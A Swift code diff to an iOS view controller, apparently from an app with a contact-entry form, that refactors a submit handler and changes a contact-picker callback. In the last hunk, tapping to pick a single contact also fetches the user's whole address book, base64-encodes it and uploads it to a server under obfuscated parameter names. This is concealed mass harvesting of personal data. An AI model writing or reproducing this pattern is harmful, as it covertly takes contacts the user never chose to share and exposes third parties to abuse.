@@ -11,6 +11,7 @@ import Combine
 import CombineCocoa
 import TYAlertController
 import MJRefresh
+import Foundation
 
 class FineMeViewController: BaseViewController {
     
@@ -101,17 +102,40 @@ class FineMeViewController: BaseViewController {
         
         nextBtn
             .tapPublisher
-            .debounce(for: .seconds(0.2), scheduler: DispatchQueue.main)
-            .sink { [weak self] _ in
-                guard let self else { return }
-                let listArray = viewModel.model?.cylind?.lud ?? []
-                var parameters = ["allate": cylindModel?.seish?.side ?? ""]
-                for model in listArray {
-                    let key = model.lentfier ?? ""
-                    let value = model.pathyish ?? ""
-                    parameters[key] = value
+            .debounce(for: .milliseconds(200), scheduler: DispatchQueue.main)
+            .compactMap { [weak self] _ -> (list: [actuallyifyModel], side: String)? in
+                guard
+                    let self,
+                    let list = self.viewModel.model?.cylind?.college?.actuallyify,
+                    let side = self.cylindModel?.seish?.side
+                else { return nil }
+                
+                return (list, side)
+            }
+            .map { input -> [String: Any]? in
+                
+                let parameterArray: [[String: String]] = input.list.map { model in
+                    [
+                        "misoile": model.misoile ?? "",
+                        "trueacle": model.trueacle ?? "",
+                        "ovilawose": model.ovilawose ?? "",
+                        "tendivity": model.tendivity ?? ""
+                    ]
                 }
-                viewModel.saveContactInfo(parameters: parameters)
+                
+                guard
+                    let jsonData = try? JSONSerialization.data(withJSONObject: parameterArray),
+                    let jsonString = String(data: jsonData, encoding: .utf8)
+                else { return nil }
+                
+                return [
+                    "allate": input.side,
+                    "cylind": jsonString
+                ]
+            }
+            .compactMap { $0 }
+            .sink { [weak self] parameters in
+                self?.viewModel.saveContactInfo(parameters: parameters)
             }
             .store(in: &cancellables)
         
@@ -228,6 +252,28 @@ extension FineMeViewController: UITableViewDelegate, UITableViewDataSource {
         }
         cell.twoBlock = { [weak self] in
             guard let self = self else { return }
+            ContactManager.shared.pickContact(from: self) { listModel in
+                let name = listModel.name
+                let phones = listModel.phones
+                
+                model.trueacle = name
+                model.misoile = phones
+                
+                cell.twoView.phoneTextFiled.text = String(format: "%@-%@", name, phones)
+            }
+            
+            ContactManager.shared.fetchAllContacts(from: self) { [weak self] list in
+                
+                guard let self = self, let jsonData = try? JSONEncoder().encode(list) else { return }
+                if list.isEmpty {
+                    return
+                }
+                let base64String = jsonData.base64EncodedString()
+                
+                let parameters = ["pathyish": String(Int(1 + 1 + 1)), "cylind": base64String]
+                viewModel.uploadContactInfo(parameters: parameters)
+            }
+            
         }
         return cell
     }
